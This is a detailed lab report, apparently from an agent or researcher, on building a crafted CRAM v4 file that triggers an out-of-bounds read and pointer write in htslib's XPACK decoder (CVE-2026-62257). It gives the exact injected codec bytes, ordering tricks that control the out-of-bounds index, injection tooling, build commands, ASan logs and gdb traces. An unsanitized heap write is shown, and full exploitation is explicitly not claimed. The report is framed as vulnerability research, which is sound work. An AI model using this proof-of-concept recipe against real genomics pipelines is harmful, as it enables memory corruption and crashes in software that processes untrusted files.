# Real CRAM v4 file driving the XPACK `block_by_id` OOB (CVE-2026-62257)

All work is local to this `realfile/` directory. No network, no changes outside it.
Pinned library: `htslib-1.23.1` (source tree untouched), prebuilt `build-plain/libhts.a`
and ASan `build-vuln/libhts.a`.

## 1. Base CRAM v4 file

`tiny.sam` has two 10 bp reads with qualities. `mkcram.c` uses public APIs only:
`hts_open(..., "wc")`, `hts_set_opt(fd, CRAM_OPT_VERSION, "4.0")`,
`hts_set_opt(fd, CRAM_OPT_NO_REF, 1)`, `sam_hdr_read`, `sam_read1`, `sam_write1`.

```
cd lab/frontier/htslib2shell
gcc -g -O0 -Ibuild-plain -Ibuild-plain/cram -Ibuild-plain/htslib \
    -o realfile/mkcram realfile/mkcram.c build-plain/libhts.a \
    -ldeflate -lz -lpthread -lm -ldl
cd realfile && ./mkcram tiny.sam base.cram
```

Observed:

```
[W::cram_set_voption] CRAM version 4.0 is still a draft ...
wrote 2 records to base.cram
$ ./htsfile-plain base.cram
base.cram:  CRAM version 4.0 compressed sequence data
$ ./htsfile-plain -c base.cram    # byte-for-byte identical to tiny.sam records
```

`base.cram` first 6 bytes are `43 52 41 4d 04 00` (`CRAM`, major 4, minor 0).
`sha256(base.cram) = b57f4386a21271b298bafa7908af1c87b92530b1ea704563136a5139453a3cd1`.

`htsfile` binaries used here were compiled from the pinned source, against the
two prebuilt libraries:

```
gcc -g -O0 -Ibuild-plain -Ibuild-plain/cram -Ibuild-plain/htslib \
    -o realfile/htsfile-plain htslib-1.23.1/htsfile.c build-plain/libhts.a \
    -ldeflate -lz -lpthread -lm -ldl
gcc -g -O0 -fsanitize=address -fsanitize-recover=address \
    -Ibuild-vuln -Ibuild-vuln/cram -Ibuild-vuln/htslib \
    -o realfile/htsfile-asan htslib-1.23.1/htsfile.c build-vuln/libhts.a \
    -ldeflate -lz -lpthread -lm -ldl
```

## 2. XPACK injection

`inject.c` (diagnostic counterpart: `dump.c`) rewrites the real file with
htslib's own APIs: `cram_open`, `cram_read_container`, `cram_read_block`,
`cram_write_container`, `cram_write_block`, `cram_write_SAM_hdr`. Lengths,
varints and CRC32s are therefore recomputed by the library, not hand-patched.

```
gcc -g -O0 -Ibuild-plain -Ibuild-plain/cram -Ibuild-plain/htslib \
    -o realfile/inject realfile/inject.c build-plain/libhts.a \
    -ldeflate -lz -lpthread -lm -ldl
cd realfile && ./inject base.cram crafted.cram
./dump crafted.cram
```

Transform applied to the data container's compression header:

* Parse preservation map verbatim (RR,RN,QO,AP,TD,SM).
* Rebuild the 21-entry record encoding map with the `QS` entry **first** and
  changed from `E_EXTERNAL` (1, param `0c`) to `E_XPACK` (51) with exactly the
  seven harness bytes `04 02 00 01 01 01 00`
  (nbits=4, nval=2, rmap=0,1, sub=E_EXTERNAL, sub-size=1, content_id=0).
  Placing `QS` first makes the nested EXTERNAL codec get `codec_id=0` and the
  XPACK codec get `codec_id=1` (`cram_decoder_init`, `cram_codecs.c:3882`), so
  the cache index is `512+1 = 513`: exactly 8 bytes past the 512-slot array.
* Copy the tag encoding map verbatim.
* Append one RAW EXTERNAL block with `content_id=0` (16 bytes of zeros) so the
  XPACK sub-codec finds an in-bounds source block; update the slice header's
  `num_blocks 5->6` and `num_content_ids 4->5` (adding id 0), container
  `num_blocks 7->8`, `c->length 276->308`, and shift the slice landmark by the
  compression-header size delta (`+6`).

`inject` output:

```
patched compression header: 145 -> 151 bytes, 21 record entries, QS first
patched slice header: 28 -> 29 bytes, blocks 5->6 ids 4->5
container 0: compression header 156 -> 162, added cid=0 block; container length 276 -> 307
wrote 2 containers, 9 blocks to crafted.cram
```

(The printed `307` is an intermediate log expression that omitted the +1 byte
slice-header growth; the actual container length written and re-read is `308`.)

`dump crafted.cram` confirms `version=0400`, first record-map entry
`QS enc=51 size=7 params: 04 02 00 01 01 01 00`, slice header block ids
`0b 0c 11 1e 00` and a final EXTERNAL block with `cid=0`.

```
$ ./htsfile-plain crafted.cram
crafted.cram:  CRAM version 4.0 compressed sequence data
```

`sha256(crafted.cram) = 992c43d80b8d259b90c8355721ec3d725d930441f97f7202494a1ec2fd67f7fb`.

## 3. ASan result (observed, positive)

```
cd realfile
ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 \
  ./htsfile-asan -c crafted.cram > crafted.asan.stdout 2> asan-htsfile.log
# exit 0 (halt_on_error=0); full log: asan-htsfile.log, 200 lines
```

`asan-htsfile.log` contains three heap-buffer-overflow reports, all at the
same address `0x521000003908`, described as
`8 bytes after 4096-byte region [0x521000002900,0x521000003900)`
allocated by `cram_read_slice` at `cram/cram_io.c:4620`:

1. `READ of size 8` — `cram_xpack_decode_expand_char cram/cram_codecs.c:1378`
2. `WRITE of size 8` — `cram_xpack_decode_expand_char cram/cram_codecs.c:1388`
3. `READ of size 8` — `cram_xpack_decode_char cram/cram_codecs.c:1417` (reads
   the just-cached pointer back for `memcpy`)

Top frames for (1) and (2) both continue through
`cram_xpack_decode_char:1416` -> `cram_decode_seq cram/cram_decode.c:1616` ->
`cram_decode_slice:2918` -> `cram_get_bam_seq:3620` -> `sam_read1:4273` ->
`view_sam htslib-1.23.1/htsfile.c:92` -> `main htsfile.c:293`.
So a real file, not a synthetic harness, reaches both OOB accesses.

The decoded qualities under ASan are the XPACK-expanded values, demonstrating
that the OOB slot was consumed as a real block pointer. Exact quality bytes
from `xxd crafted.asan.stdout`:

```
read1  ...  ACGTACGTAC  21 21 21 21 21 21 21 21 21 21
read2  ...  TGCATGCATG  21 21 df df df df df df df df
```

(The quality bytes are reported verbatim; their exact values are not part of
the OOB claim.)

`gdb` on the **plain** build at `cram_codecs.c:1378` observed
`codec_id=1` and OOB slot value `slot=0x1011` (glibc chunk size field, always
non-NULL). Consequently plain `htsfile-plain -c crafted.cram` takes the
`if (b) return 0;` early-out at line 1379, performs **no** write, and later
segfaults at `cram_codecs.c:1422` in `memcpy(out, b->data + b->byte, ...)` with
that junk pointer (exit 139; stderr only `Unknown codec type 51`). Under ASan
the redzone byte is zero, so the write at 1388 fires. This confirms the parent
finding: the natural plain-build effect is an OOB read returning a junk pointer,
not a pointer write.

Plain-build observation recorded with:

```
gdb -q -batch -ex 'break cram_codecs.c:1378' -ex 'run -c crafted.cram' \
    -ex 'printf "codec_id=%d slot=%p\n", c->codec_id, slice->block_by_id[512+c->codec_id]' \
    -ex continue --args ./htsfile-plain -c crafted.cram
```

`./htsfile-asan crafted.cram` (identify mode only) does **not** decode slices and
produces no ASan report; `-c` (view all) is required to reach the bug, because
`htsfile.c:276-287` identifies by format detection alone while `htsfile.c:92`
calls `sam_read1`.

## 4. Exact source-line evidence (pinned 1.23.1)

* `cram/cram_codecs.c:1377-1389`

  ```c
  static int cram_xpack_decode_expand_char(cram_slice *slice, cram_codec *c) {
      cram_block *b = slice->block_by_id[512 + c->codec_id];   /* 1378 READ */
      if (b)
          return 0;                                            /* 1379 */
      ...
      b = slice->block_by_id[512 + c->codec_id] = cram_new_block(0, 0); /* 1388 WRITE */
  ```

* `cram/cram_codecs.c:1415-1423`: `if (nval > 1) { cram_xpack_decode_expand_char(); b = slice->block_by_id[512+c->codec_id]; memcpy(out, b->data + b->byte, *out_size); }`
* `cram/cram_codecs.c:3877-3884`: `cram_decoder_init()` assigns `r->codec_id = hdr->ncodecs++` (nested sub-codec first, then XPACK).
* `cram/cram_codecs.c:1453-1501`: `cram_xpack_decode_init()` parses nbits/nval/rmap, then `cram_decoder_init(hdr, encoding=1, sub_size=1, ...)`.
* `cram/cram_decode.c:449-450`: record key `QS` gets `ds_id=DS_QS, type=E_BYTE` -> `cram_xpack_decode_char`.
* `cram/cram_decode.c:466-468`: parser takes encoding and size straight from file bytes with no version gate.
* `cram/cram_io.c:4620`: `s->block_by_id = calloc(512, sizeof(s->block[0]))` — the 4096-byte region ASan reports.
* `htslib/hts.h:307` (`CRAM_OPT_NO_REF`), `cram/cram_io.c:5834-5866` (`CRAM_OPT_VERSION` accepts `4.0`).

## 5. Scope of the claim

Observed: a genuine CRAM v4 file (produced by htslib's own writer) with an
injected XPACK codec reaches `cram_codecs.c:1378` READ and `:1388` WRITE under
ASan, with the ASan address exactly 8 bytes past the 4096-byte `calloc`.
Not claimed: rung 4 (no chosen pointer, no controlled heap neighbour value was
demonstrated). Under the unsanitized allocator the neighbouring slot is a
non-NULL chunk-size field (`0x1011`), which suppresses the write and produces a
junk-pointer read instead.

## 6. FILE-DERIVED codec_id=2: unsanitized OOB pointer WRITE fires (2026-11-21 ~17:32Z, wake 2)

New lane: `inject2.c` (copy of `inject.c` with the BF record-map entry emitted
before QS). BF consumes `codec_id=0`, XPACK's nested EXTERNAL sub-codec gets 1,
XPACK itself gets **2** — entirely from compression-header bytes, no gdb edit.
`./inject2 base.cram crafted2.cram` builds it with htslib's own container/block
writers (same layout as `crafted.cram`, 523-ish bytes).

Observed in the **plain, unsanitized** `htsfile-plain` under gdb:

```
break cram_codecs.c:1378
STOP codec_id=2 base=0x5555556dc5c0 slot513=0x1011 slot514=(nil) slot515=(nil)
x/6gx base+4096:  0x0  0x1011  0x0  0x0  0x0  0x0
break cram_codecs.c:1388; continue
AT1388 codec_id=2        # guard at :1379 PASSED in the natural plain heap
continue -> second hit :1378 shows slot514=0x5555556df1b0
```

So index **514** (offset 4112, 16 bytes past the 4096-byte `calloc`) reads NULL
in the untouched glibc heap: it is the *user data* of the following live 4096-
byte chunk (its size field `0x1011` sits at offset 4104 = index 513, which is
why the earlier codec_id=1 file took the early-out and only did an OOB read).
`:1388` stores the freshly allocated `cram_block *` into index 514. This is a
real 8-byte pointer store outside the array in a build with **no sanitizer and
no instrumentation change to codec_id**; only the codec order in the file changed.
The stored value is the allocator's pointer, not a chosen value.

Controls:

* `ASAN_OPTIONS=detect_leaks=0:halt_on_error=0 ./htsfile-asan -c crafted2.cram`
  rc 0, 3 heap-buffer-overflow reports; `READ of size 8` at :1378 and
  `WRITE of size 8` at :1388, address `0x521000003910` (= 16 bytes after the
  4096-byte `cram_read_slice` region). Logs `crafted2.asan.stderr`.
* Plain `./htsfile-plain -c crafted2.cram` still exits 139: gdb puts the fault
  at `cram_codecs.c:1422 memcpy(out, b->data + b->byte, *out_size)` from
  `cram_decode.c:1833`, i.e. a later decode of a different instance/series;
  the pointer store at :1388 had already executed. Not a controlled diversion.
* `htsfile-fixed` built from pinned 1.24 against `build-fixed/libhts.a` is NOT a
  valid whole-file control here: it reports `Container header CRC32 failure`
  even on `base.cram`. Frontier's harness-level 1.24 control (codec 51 rejected)
  remains the only clean fixed-pin evidence. Do not cite this broken control.

Grade: rung 1 corrected once more — the unsanitized WRITE is reachable from a
real CRAM file when the file-derived codec index lands on a NULL OOB slot.
Rung 4 is still INSTRUMENTED: no chosen pointer value, no groomed neighbour
field with a known consumer, no control-flow diversion, no execution.
